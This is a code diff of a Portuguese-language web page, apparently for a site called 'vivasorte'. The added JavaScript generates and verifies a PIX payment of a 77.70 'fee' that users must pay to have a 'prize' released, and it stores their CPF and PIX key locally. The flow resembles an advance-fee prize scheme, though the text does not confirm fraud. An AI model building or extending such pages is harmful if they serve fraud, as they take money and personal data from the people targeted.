+            erroTaxa.textContent = `Erro ao gerar PIX da taxa: ${error.message}`;
+            erroTaxa.style.display = 'block';
+            
+            mostrarPopupNotificacao('Erro ao gerar PIX da taxa. Tente novamente.', true);
+        }
+    }
+
+    function copiarCodigoPIXTaxa() {
+        const codigoInput = document.getElementById('codigoPIXTaxa');
+        const btnCopiar = document.querySelector('#areaPIXTaxa .input-copiar button');
+        
+        if (!codigoInput.value) {
+            mostrarPopupNotificacao('❌ Nenhum código PIX disponível.', true);
+            return;
+        }
+        
+        const textoOriginal = btnCopiar.textContent;
+        
+        codigoInput.select();
+        codigoInput.setSelectionRange(0, 99999);
+        
+        navigator.clipboard.writeText(codigoInput.value)
+            .then(() => {
+                btnCopiar.textContent = '✅ Copiado!';
+                btnCopiar.style.background = '#28a745';
+                
+                mostrarPopupNotificacao('✅ Código PIX da taxa copiado!');
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            })
+            .catch(err => {
+                console.error('Erro ao copiar: ', err);
+                document.execCommand('copy');
+                btnCopiar.textContent = '❌ Falhou';
+                btnCopiar.style.background = '#e74c3c';
+                
+                mostrarPopupNotificacao('⚠️ Selecione e copie manualmente (Ctrl+C).', true);
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            });
+    }
+
+    // VERIFICAÇÃO DO PAGAMENTO DA TAXA
+    async function verificarPagamentoTaxa() {
+        if (!dadosUsuario.transactionIdTaxa) {
+            return;
+        }
+        
+        document.getElementById('statusTaxa').textContent = `Verificando pagamento da taxa...`;
+        
+        try {
+            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    transaction_id: dadosUsuario.transactionIdTaxa
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (!result.success) {
+                console.log('❌ Erro na verificação da taxa:', result.error);
+                return;
+            }
+            
+            const status = result.status;
+            
+            console.log(`📊 Status da taxa: ${status}`);
+            
+            const statusConfirmados = ['paid', 'completed', 'approved'];
+            
+            if (statusConfirmados.includes(status)) {
+                console.log('✅ Taxa paga com sucesso!');
+                
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #28a745;">✅ Taxa paga! Liberando prêmio...</span>';
+                
+                clearInterval(verificacaoTaxaAutomatica);
+                verificacaoTaxaAutomatica = null;
+                
+                dadosUsuario.taxaPaga = true;
+                
+                // Esconde área de pagamento e mostra mensagem final
+                document.getElementById('areaPagamentoTaxa').style.display = 'none';
+                document.getElementById('mensagemFinalPremio').style.display = 'block';
+                
+                salvarTaxaPaga();
+                
+                mostrarPopupNotificacao('✅ Taxa paga! Prêmio liberado. Aguarde contato.');
+                
+            } else if (status === 'expired' || status === 'failed' || status === 'canceled') {
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">❌ Pagamento da taxa falhou. Gere um novo PIX.</span>';
+            } else {
+                document.getElementById('statusTaxa').textContent = `Aguardando confirmação do pagamento da taxa...`;
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro na verificação da taxa:', error);
+            document.getElementById('statusTaxa').textContent = `Erro na verificação. Tentando novamente...`;
+        }
+    }
+
+    function iniciarVerificacaoTaxaAutomatica() {
+        console.log('🔄 Iniciando verificação da taxa a cada 5 segundos');
+        
+        document.getElementById('aguardandoTaxa').style.display = 'block';
+        
+        verificarPagamentoTaxa();
+        
+        verificacaoTaxaAutomatica = setInterval(verificarPagamentoTaxa, 5000);
+        
+        setTimeout(() => {
+            if (verificacaoTaxaAutomatica) {
+                clearInterval(verificacaoTaxaAutomatica);
+                verificacaoTaxaAutomatica = null;
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">⏰ Tempo esgotado. Se pagou, contate o suporte.</span>';
+            }
+        }, 1800000);
+    }
+
+    function salvarTaxaPaga() {
+        const transacaoTaxa = {
+            id: dadosUsuario.transactionIdTaxa,
+            cpf: dadosUsuario.cpf,
+            chave_pix: dadosUsuario.chavePix,
+            tipo_chave: dadosUsuario.tipoChavePix,
+            valor: 77.70,
+            data: new Date().toISOString(),
+            status: 'taxa_paga',
+            confirmado_em: new Date().toISOString()
+        };
+        
+        let taxasPagas = JSON.parse(localStorage.getItem('vivasorte_taxas') || '[]');
+        taxasPagas.push(transacaoTaxa);
+        localStorage.setItem('vivasorte_taxas', JSON.stringify(taxasPagas));
+        
+        console.log('✅ Taxa paga salva:', transacaoTaxa);
+    }
+
+    // FUNÇÕES AUXILIARES
     function mostrarPopupNotificacao(mensagem, isError = false) {
         const popup = document.getElementById('popup');
         popup.textContent = mensagem;
@@ -2109,6 +2562,7 @@
     src="https://www.facebook.com/tr?id=1566849421225167&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
+    
     <!-- UTMify Script -->
     <script
         src="https://cdn.utmify.com.br/scripts/utms/latest.js"
